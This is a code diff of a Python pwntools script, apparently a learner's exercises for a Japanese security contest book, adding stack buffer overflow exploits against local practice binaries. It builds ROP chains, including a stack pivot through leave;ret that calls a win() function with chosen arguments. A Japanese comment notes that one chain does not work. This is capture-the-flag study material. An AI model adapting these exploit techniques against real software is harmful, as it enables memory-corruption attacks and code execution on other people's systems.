@@ -224,8 +224,11 @@ def main( args ):
         # $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./sbof_ret"
         # $ python pwnable.py --ope sbof_ret --debug
         
+        # r15 に与えるアドレスが見つからなかったのでうまく動作しない
+        
         adrs = 'localhost'
         port = 4000
+        elf  = ELF( "../shokai_security_contest/files/pwnable/03_stack/sbof_ret" )
         
         # サーバに接続
         proc = remote( adrs, port )
@@ -234,16 +237,65 @@ def main( args ):
         
         ropchain = b''
         
-        ropchain += p64( 0x40127a )   # to pop rbx
-        ropchain += p64( 0 )          # rbx
-        ropchain += p64( 1 )          # rbp
-        ropchain += p64( 0xcafebabe ) # r12d -> edi
+        ropchain += p64( 0x40127a )           # to pop rbx...
+        ropchain += p64( 0 )                  # rbx
+        ropchain += p64( 1 )                  # rbp
+        ropchain += p64( 0xcafebabe )         # r12d -> edi
         ropchain += p64( 0x0123456789ABCDEF ) # r13 -> RSI
         ropchain += p64( 0xFEDCBA9876543210 ) # r14 -> RDX
-        ropchain += p64( 0x4011d1 )   # r15 for call
-        ropchain += p64( 0x401260 )   # to pop rbx
+        ropchain += p64( elf.got['puts'] )    # r15 for call
+        ropchain += p64( 0x401260 )           # to pop rbx
         overwrite_ret_adrs( proc, 24, ropchain, dmy=b'\x00' )
         
+    
+    elif args.ope == "sbof_pivot":
+        
+        # $ python pwnable.py --ope sbof_pivot
+        
+        context( os='linux', arch='amd64' )
+        
+        adrs = 'localhost'
+        port = 4000
+        #prog = "../shokai_security_contest/files/pwnable/03_stack/sbof_pivot"
+        prog = "./sbof_pivot"
+        elf  = ELF( prog )
+        
+        if False:
+            # サーバに接続
+            #proc = remote( adrs, port )
+            proc = prologue_one( prog )
+            
+            logging.debug( "recv 1: " + proc.recv(timeout=2) ) # Input Name >> 
+        else:
+            proc = process( ['sh', '-c', prog] )
+            #proc = process( prog )
+        
+        ropchain = b''
+        
+        ropchain += p64( 0x404060 + 192 - 8 )     # Saved RBP 
+        ropchain += p64( 0x4011e4 )               # leave; ret;
+        
+        if False:
+            overwrite_ret_adrs( proc, 16, ropchain[:-1], dmy=b'\x00' )
+            logging.debug( proc.recv(timeout=2) ) # Input Message >>
+        else:
+            logging.debug( proc.recvline() )
+            logging.debug( proc.recv(timeout=1) )
+            logging.debug( proc.sendline(b'A' * 16 + ropchain[:-1]) )
+        
+        ropchain = b''
+        
+        ropchain += p64( 0x4012a3 )           # pop rdi; ret;
+        ropchain += p64( 0xcafebabe )         # 
+        ropchain += p64( 0x4012a1 )           # pop rsi; pop r15; ret;
+        ropchain += p64( 0xc0bebeef )         # 
+        ropchain += p64( 0xdeadbeef )         # 何でもいい
+        ropchain += p64( 0x4011e6 )           # win()
+        
+        if False:
+            overwrite_ret_adrs( proc, 192, ropchain, dmy=b'\x00' )
+        else:
+            logging.debug( proc.sendafter('>> ', b'A' * 192 + ropchain, 3) )
     
     else:
         raise
@@ -261,6 +313,16 @@ def prologue( prog, ss ):
     
     # "Give me your message >> "
     logging.debug( proc.recv(timeout=1) )
+    
+    return proc
+
+def prologue_one( prog ):
+    
+    # program起動
+    proc = process( ['sh', '-c', prog] )
+    
+    # "Hello!"
+    logging.debug( "recv 0: " + proc.recvline() )
     
     return proc
 
@@ -310,12 +372,12 @@ def check_sof( proc ):
 def overwrite_ret_adrs( proc, cnt, adrs, to=1, dmy=b'\x41' ):
     
     ss = dmy * cnt + adrs
-    logging.debug( ss )
+    logging.debug( "send: " + ss.hex() )
     proc.sendline( ss )
     
     # receive error
     ret = proc.recv( timeout=to )
-    logging.debug( ret )
+    logging.debug( "recv: " + ret.hex() )
     
     return ret
 
